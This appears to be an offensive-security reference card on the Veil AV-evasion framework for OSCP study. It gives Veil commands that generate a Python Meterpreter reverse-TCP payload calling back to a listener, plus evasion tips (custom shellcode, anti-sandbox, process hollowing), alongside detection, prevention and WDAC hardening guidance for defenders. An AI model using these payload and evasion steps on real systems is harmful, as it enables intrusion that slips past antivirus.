name: Veil - On-Disk AV Evasion Payload
description: Veil is a standalone framework that wraps shellcode in Python, PowerShell, C, and other language templates to defeat signature-based AV on disk. Where msfvenom -e is now reliably caught, Veil's language-native wrappers (and its use of OS-native interpreters to run the payload) can survive. On the OSCP exam Veil is an allowed standalone tool — not a Metasploit module.

examples.label: Generate a Python payload (Ordeal example)
examples.command:
use python/meterpreter/rev_tcp
set LHOST 192.168.49.128
set LPORT 443
generate

notes: Veil has two tools: Evasion (generates AV-evading payloads) and Ordeal (obfuscates shellcode). Pick a language template that fits the target - Python and PowerShell templates require those interpreters on the victim but tend to evade well; C templates produce a standalone EXE. Veil still embeds shellcode internally, so behavioral/heuristic detection can still flag the API call sequence (VirtualAlloc + CreateThread) - pair with in-memory techniques for hardened targets. Test every generated artifact on antiscan.me (not VirusTotal) before deploying. Install on Kali: `sudo apt install veil` (or `/usr/share/veil/config/setup.sh --force --silent` on older setups). Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).

recommended.note: Understand what detection layer Veil is bypassing before picking a template.
Fully in-memory: no file written, beats on-disk scanning entirely.

defense.why_it_works: Veil generates shellcode wrappers in Python, C, Ruby, or PowerShell that embed Metasploit shellcode (or custom shellcode) and decrypt/execute it at runtime. By encoding the shellcode (XOR, AES) and varying the wrapper language and structure, Veil produces executables that evade signature-based AV that only scans for known Metasploit shellcode byte patterns. The generated executable decodes the shellcode in memory and executes it.
defense.prerequisites: Veil framework installed on Kali. Metasploit shellcode or custom shellcode. Target architecture (x86/x64). Target OS. Understanding of which AV product is on the target (test against it specifically).
defense.impact: T1027 Obfuscated Files or Information + T1588.005 Obtain Capabilities: Exploits. Produces executables that bypass signature-based AV to deliver shellcode (Meterpreter, custom C2 beacon). Enables initial access or post-exploitation on endpoints with AV.
defense.detection:
AMSI: PowerShell-wrapper Veil payloads scanned by AMSI in-memory. Behavioral EDR: shellcode injection pattern from a newly created executable. Memory scan: Meterpreter shellcode patterns in process memory post-injection. VirusTotal / cloud AV: known Veil output patterns are signatured. Executable anomalies: no PE sections, unusual entropy (encrypted payload = high entropy).
Script execution or suspicious parent processes correlated with creation/modification of encoded, compressed, or encrypted file formats (.zip, .7z, .enc) and abnormal command-line syntax or PowerShell obfuscation (DET0378/AN1064).
Use of gzip, base64, tar, or openssl in scripts or commands that encode/encrypt files after file staging or system enumeration (AN1065).
Archive or encryption tools (zip, openssl) tied to user-scripted activity or binaries writing encrypted output files (AN1066).
defense.artifacts: EDR alert: shellcode injection from non-standard process | AMSI block event | High-entropy executable detected by AV | Memory scan: Meterpreter shellcode in process memory | Network: Meterpreter C2 traffic pattern (SSL + specific handshake)
defense.prevention:
EDR with behavioral detection — Veil payloads evade signature AV but behavioral EDR catches shellcode injection. AMSI for PowerShell wrappers. Application control (WDAC) prevents unknown executables. Network inspection for Meterpreter C2 protocol patterns. Email/web gateway malware scanning.
Antivirus/Antimalware: Use AMSI on Windows 10+ to analyze commands after being processed/interpreted; auto-quarantine suspicious encoded files.
Audit: Periodically review common fileless storage locations (Registry, WMI repository) for abnormal and malicious data.
Behavior Prevention on Endpoint: Enable Windows 10+ ASR rules to prevent execution of potentially obfuscated payloads.
defense.evasion: Use custom shellcode (not Meterpreter) — avoids Meterpreter-specific signatures. Combine Veil with sleep+jitter and anti-sandbox. Generate for specific AV and test before delivery. Use process hollowing or injection rather than direct shellcode execution (different behavioral signature).
defense.misconfiguration: Signature-only AV without behavioral detection. AMSI not enabled. Application control not deployed. No network C2 traffic detection.
defense.vulnerable_config:
# Signature-only AV (Windows Defender without EDR):
Get-MpComputerStatus | Select-Object AMRunningMode
# AMRunningMode: Normal = signature only, no EDR component

# No application control:
# Any unsigned executable runs without restriction
defense.secure_config:
# Application control via WDAC:
# Start with audit mode policy, monitor unsigned binaries for 30 days
# Then enforce: only signed/allowed binaries execute
New-CIPolicy -Level Publisher -FilePath C:\Policy\BasePolicy.xml -UserPEs
ConvertFrom-CIPolicy C:\Policy\BasePolicy.xml C:\Windows\System32\CodeIntegrity\SIPolicy.p7b

# EDR behavioral detection:
# Defender for Endpoint P2 includes: process injection detection, memory scanning
# CrowdStrike Falcon: detects shellcode injection patterns regardless of obfuscation
